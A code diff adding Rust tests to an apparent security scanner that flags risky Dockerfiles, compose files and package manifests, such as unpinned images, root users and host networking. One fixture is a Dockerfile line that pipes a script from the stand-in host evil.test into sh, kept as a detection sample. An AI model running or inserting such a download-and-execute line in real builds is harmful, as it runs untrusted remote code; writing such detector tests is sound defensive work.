@@ -164,6 +164,136 @@ fn finds_package_manifest_unbounded_dependency() {
 }
 
 #[test]
+fn finds_package_manifest_direct_url_dependency() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::PackageManifest,
+        SourceFormat::Json,
+        r#"{"dependencies":{"demo":"https://registry.example.test/demo/-/demo-1.2.3.tgz"}}"#,
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC753"));
+}
+
+#[test]
+fn finds_dockerfile_run_download_exec() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::Dockerfile,
+        SourceFormat::Shell,
+        "FROM alpine:3.20\nRUN curl https://evil.test/install.sh | sh\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC746"));
+}
+
+#[test]
+fn finds_dockerfile_mutable_image() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::Dockerfile,
+        SourceFormat::Shell,
+        "FROM ghcr.io/acme/app:1.2\nRUN echo hi\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC749"));
+}
+
+#[test]
+fn finds_dockerfile_latest_image() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::Dockerfile,
+        SourceFormat::Shell,
+        "FROM alpine\nRUN echo hi\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC751"));
+}
+
+#[test]
+fn finds_dockerfile_final_stage_root_user() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::Dockerfile,
+        SourceFormat::Shell,
+        "FROM rust:1.87 AS build\nUSER root\nRUN cargo build --release\nFROM debian:bookworm-slim\nUSER root\nCMD [\"/app\"]\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC747"));
+}
+
+#[test]
+fn ignores_intermediate_dockerfile_root_user_when_final_stage_is_nonroot() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::Dockerfile,
+        SourceFormat::Shell,
+        "FROM rust:1.87 AS build\nUSER root\nRUN cargo build --release\nFROM gcr.io/distroless/cc-debian12@sha256:0123456789abcdef\nUSER nonroot\nCMD [\"/app\"]\n",
+    );
+
+    assert!(!findings.iter().any(|finding| finding.rule_code == "SEC747"));
+}
+
+#[test]
+fn finds_docker_compose_privileged_runtime() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::DockerCompose,
+        SourceFormat::Yaml,
+        "services:\n  app:\n    image: alpine:3.20\n    network_mode: host\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC748"));
+}
+
+#[test]
+fn finds_docker_compose_latest_image() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::DockerCompose,
+        SourceFormat::Yaml,
+        "services:\n  app:\n    image: nginx:latest\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC752"));
+}
+
+#[test]
+fn ignores_safe_docker_compose_runtime() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::DockerCompose,
+        SourceFormat::Yaml,
+        "services:\n  app:\n    image: alpine:3.20\n    cap_add:\n      - NET_BIND_SERVICE\n",
+    );
+
+    assert!(!findings.iter().any(|finding| finding.rule_code == "SEC748"));
+}
+
+#[test]
+fn finds_docker_compose_mutable_image() {
+    let provider = AiSecurityProvider::default();
+    let findings = ProviderHarness::run(
+        Arc::new(provider),
+        ArtifactKind::DockerCompose,
+        SourceFormat::Yaml,
+        "services:\n  app:\n    image: ghcr.io/acme/app:1.2\n",
+    );
+
+    assert!(findings.iter().any(|finding| finding.rule_code == "SEC750"));
+}
+
+#[test]
 fn finds_hidden_html_comment_download_exec() {
     let provider = AiSecurityProvider::default();
     let findings = ProviderHarness::run(
